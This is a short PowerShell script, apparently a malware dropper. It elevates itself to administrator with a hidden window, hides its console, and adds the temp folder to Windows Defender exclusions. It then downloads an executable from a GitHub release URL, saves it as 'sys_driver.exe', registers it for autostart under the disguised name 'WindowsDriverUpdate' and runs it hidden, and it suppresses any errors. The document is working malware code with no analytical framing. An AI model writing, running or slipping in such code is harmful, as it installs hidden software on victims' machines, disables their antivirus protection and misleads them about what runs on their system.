if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
    Start-Process powershell -ArgumentList $arguments -Verb RunAs
    exit
}
$showWindow = Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);' -Name "Win32ShowWindow" -Namespace Win32Functions -PassThru
$showWindow::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -ExpandProperty MainWindowHandle), 0)

Add-MpPreference -ExclusionPath $env:TEMP

$url = "https://github.com/LianMtown-cmyk/FSTALK/releases/download/main3/ilver.exe"
$path = "$env:TEMP\sys_driver.exe"

try {
    Invoke-WebRequest -Uri $url -OutFile $path
    
    # 5. Autostart in der Registry anlegen
    $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    if (-not (Get-ItemProperty -Path $registryPath -Name "WindowsDriverUpdate" -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path $registryPath -Name "WindowsDriverUpdate" -Value $path -PropertyType String
    }

    Start-Process -FilePath $path -WindowStyle Hidden
} catch {

}